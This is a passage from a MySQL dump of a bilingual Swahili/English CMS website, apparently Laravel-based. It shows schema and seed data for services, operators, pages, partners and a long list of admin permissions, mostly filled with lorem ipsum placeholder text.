Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,<span style=\"font-size:11pt\"><span style=\"font-family:Calibri,sans-serif\"><span style=\"font-size:12.0pt\"> </span></span></span></p>', 1, 1, 'mchakato-bodi-wataalam-hifadhi-ya-jamii-bima-waanza', '36e0116ba0c787d074fd1a669f5c2a40.jpeg', '2022-08-25 14:17:44', '2022-10-17 01:34:04'),
(16, 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', '', NULL, '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,</p>', 1, 1, 'lorem-ipsum-dolor-sit-amet-consectetur-adipisicing-elit', '49807b35943ec3ea7129299fc6f86e3f.jpeg', '2022-10-17 01:31:39', '2022-10-17 01:31:39');

-- --------------------------------------------------------

--
-- Table structure for table `online_services`
--

CREATE TABLE `online_services` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `online_services`
--

INSERT INTO `online_services` (`id`, `title_sw`, `title_en`, `url`, `active`, `created_at`, `updated_at`, `parent`, `position`) VALUES
(1, 'TIC', 'TIC', 'http://tic.go.tz', 1, '2021-07-28 06:16:15', '2021-08-09 12:30:37', 0, 3),
(2, 'PMO Uwekezaji', 'PMO Uwekezaji', 'http://pmo.go.tz', 1, '2021-07-28 06:16:48', '2021-08-09 12:30:38', 0, 6),
(3, 'TPSF', 'TPSF', 'http://tpsf.go.tz', 1, '2021-07-28 06:17:24', '2021-08-09 12:30:37', 0, 2),
(4, 'TRA', 'TRA', 'http://trc.go.tz', 1, '2021-07-28 06:17:43', '2021-08-09 12:30:37', 0, 4),
(5, 'Viwanda na Biashara', 'Viwanda na Biashara', 'http://wiwanda.com', 1, '2021-07-28 06:18:04', '2021-08-09 12:30:38', 0, 5),
(6, 'TNBP', 'TNBP', 'http://tnbp.go.tz', 1, '2021-07-28 06:18:36', '2022-02-10 12:28:02', 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `operators`
--

CREATE TABLE `operators` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `operators`
--

INSERT INTO `operators` (`id`, `name`, `phone`, `email`, `address`, `active`, `slug`, `created_at`, `updated_at`) VALUES
(2, 'guleay lorem', '0692261056', 'engotheta@gmail.com', 'P.0 58725', 1, 'luceedb-lorem', '2022-06-30 19:30:16', '2022-06-30 19:30:16'),
(3, 'kayce dev', '0692261056', 'beta@gmail.com', 'P.0 58725', 1, 'luceedb-lorem', '2022-06-30 19:30:16', '2022-06-30 19:30:16'),
(4, 'shezy benl', '0692261057', 'tups@gmail.com', 'P.0 58725', 1, 'luceedb-lorem', '2022-06-30 19:30:16', '2022-06-30 19:30:16');

-- --------------------------------------------------------

--
-- Table structure for table `pages`
--

CREATE TABLE `pages` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `has_sidebar` smallint(1) NOT NULL DEFAULT 0,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `pages`
--

INSERT INTO `pages` (`id`, `title_sw`, `title_en`, `has_sidebar`, `content_sw`, `content_en`, `slug`, `status`, `created_at`, `updated_at`) VALUES
(6, 'Kuhusu Sisi', 'About us', 1, '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit quibusdam sed amet tempora. Sit laborum ab, eius fugit doloribus tenetur fugiat, temporibus enim commodi iusto libero magni deleniti quod quam consequuntur! Commodi minima excepturi repudiandae velit hic maxime doloremque. Quaerat provident commodi consectetur veniam similique ad earum omnis ipsum saepe, voluptas, hic voluptates pariatur est explicabo fugiat, dolorum eligendi quam cupiditate excepturi mollitia maiores labore suscipit quas? Nulla, placeat. Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus sint culpa, recusandae aliquam numquam totam ratione voluptas quod exercitationem fuga. Possimus quis earum veniam quasi aliquam eligendi, placeat qui corporis!</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit quibusdam sed amet tempora. Sit laborum ab, eius fugit doloribus tenetur fugiat, temporibus enim commodi iusto libero magni deleniti quod quam consequuntur! Commodi minima excepturi repudiandae velit hic maxime doloremque. Quaerat provident commodi consectetur veniam similique ad earum omnis ipsum saepe, voluptas, hic voluptates pariatur est explicabo fugiat, dolorum eligendi quam cupiditate excepturi mollitia maiores labore suscipit quas? Nulla, placeat. Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus sint culpa, recusandae aliquam numquam totam ratione voluptas quod exercitationem fuga. Possimus quis earum veniam quasi aliquam eligendi, placeat qui corporis!</p>', 'about-us', 1, '2022-07-17 08:04:37', '2022-07-17 08:04:37');

-- --------------------------------------------------------

--
-- Table structure for table `page_categories`
--

CREATE TABLE `page_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 0,
  `modifiable` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `partners`
--

CREATE TABLE `partners` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `position` int(4) NOT NULL DEFAULT 1,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `partners`
--

INSERT INTO `partners` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `active`, `user_id`, `slug`, `url`, `position`, `photo_url`, `created_at`, `updated_at`) VALUES
(3, 'Google', 'Google', '', NULL, '<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>', '<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting-2', 'https://www.google.com', 3, '32817c61f3286fd0d9e6a9699ca34548', '2021-09-02 02:58:21', '2022-10-15 12:31:37'),
(4, 'Microsoft', 'Microsoft', '', NULL, '<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>', '<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting-3', 'https://www.microsoft.com/', 2, 'a505c8a1df292335bee3b57c18aa90e1', '2022-01-02 02:58:21', '2022-10-15 12:30:53'),
(5, 'Amazon', 'Amazon', '', NULL, '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>', 1, 1, 'lorem-ipsum-dolor-sit-amet-consectetur-adipiscing-elit-donec-mollis-consequat', 'http://amazon.co.uk', 1, 'b52c3e2a4cc7eb8e7ad39c875584e422', '2022-01-08 13:30:30', '2022-10-15 12:30:04');

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `permissions`
--

CREATE TABLE `permissions` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `guard_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `permissions`
--

INSERT INTO `permissions` (`id`, `name`, `guard_name`, `created_at`, `updated_at`) VALUES
(1, 'cms.cms.dashboard.view-dashboard', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(2, 'cms.backgrounds.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(3, 'cms.backgrounds.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(4, 'cms.backgrounds.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(5, 'cms.backgrounds.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(6, 'cms.backgrounds.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(7, 'cms.backgrounds.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(8, 'cms.backgrounds.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(9, 'cms.services.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(10, 'cms.services.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(11, 'cms.services.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(12, 'cms.services.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(13, 'cms.services.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(14, 'cms.services.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(15, 'cms.services.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(16, 'cms.seo.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(17, 'cms.seo.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(18, 'cms.seo.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(19, 'cms.seo.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(20, 'cms.seo.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(21, 'cms.seo.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(22, 'cms.seo.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(23, 'cms.preferences.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(24, 'cms.preferences.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(25, 'cms.preferences.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(26, 'cms.preferences.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(27, 'cms.preferences.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(28, 'cms.preferences.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(29, 'cms.preferences.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(30, 'cms.faqs.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(31, 'cms.faqs.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(32, 'cms.faqs.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(33, 'cms.faqs.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(34, 'cms.faqs.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(35, 'cms.faqs.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(36, 'cms.faqs.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(37, 'cms.news.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(38, 'cms.news.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(39, 'cms.news.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(40, 'cms.news.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(41, 'cms.news.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(42, 'cms.news.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(43, 'cms.news.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(44, 'cms.events.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(45, 'cms.events.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(46, 'cms.events.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(47, 'cms.events.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(48, 'cms.events.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(49, 'cms.events.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(50, 'cms.events.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(51, 'cms.regional_office.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(52, 'cms.regional_office.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(53, 'cms.regional_office.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(54, 'cms.regional_office.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(55, 'cms.regional_office.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(56, 'cms.regional_office.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(57, 'cms.regional_office.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(58, 'cms.complaints.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(59, 'cms.complaints.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(60, 'cms.complaints.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(61, 'cms.complaints.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(62, 'cms.complaints.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(63, 'cms.complaints.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(64, 'cms.complaints.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(65, 'cms.related_links.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(66, 'cms.related_links.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(67, 'cms.related_links.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(68, 'cms.related_links.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(69, 'cms.related_links.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(70, 'cms.related_links.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(71, 'cms.related_links.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(72, 'cms.social_links.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(73, 'cms.social_links.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(74, 'cms.social_links.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(75, 'cms.social_links.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(76, 'cms.social_links.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(77, 'cms.social_links.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(78, 'cms.social_links.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(79, 'cms.about_links.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(80, 'cms.about_links.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(81, 'cms.about_links.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(82, 'cms.about_links.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(83, 'cms.about_links.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(84, 'cms.about_links.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(85, 'cms.about_links.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(86, 'cms.support_links.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(87, 'cms.support_links.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(88, 'cms.support_links.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(89, 'cms.support_links.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(90, 'cms.support_links.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(91, 'cms.support_links.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(92, 'cms.support_links.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(93, 'cms.googlemaps.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(94, 'cms.googlemaps.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(95, 'cms.googlemaps.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(96, 'cms.googlemaps.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(97, 'cms.googlemaps.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(98, 'cms.googlemaps.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(99, 'cms.googlemaps.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(100, 'cms.welcome.index', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(101, 'cms.welcome.create', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(102, 'cms.welcome.store', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(103, 'cms.welcome.show', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(104, 'cms.welcome.edit', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(105, 'cms.welcome.update', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(106, 'cms.welcome.destroy', 'web', '2022-03-11 04:11:10', '2022-03-11 04:11:10'),
(107, 'cms.announcements.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(108, 'cms.announcements.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(109, 'cms.announcements.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(110, 'cms.announcements.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(111, 'cms.announcements.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(112, 'cms.announcements.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(113, 'cms.announcements.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(114, 'cms.press_releases.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(115, 'cms.press_releases.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(116, 'cms.press_releases.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(117, 'cms.press_releases.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(118, 'cms.press_releases.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(119, 'cms.press_releases.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(120, 'cms.press_releases.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(121, 'cms.speeches.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(122, 'cms.speeches.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(123, 'cms.speeches.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(124, 'cms.speeches.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(125, 'cms.speeches.edit', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(126, 'cms.speeches.update', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(127, 'cms.speeches.destroy', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(128, 'cms.administration.index', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(129, 'cms.administration.create', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(130, 'cms.administration.store', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
(131, 'cms.administration.show', 'web', '2022-03-11 04:11:11', '2022-03-11 04:11:11'),
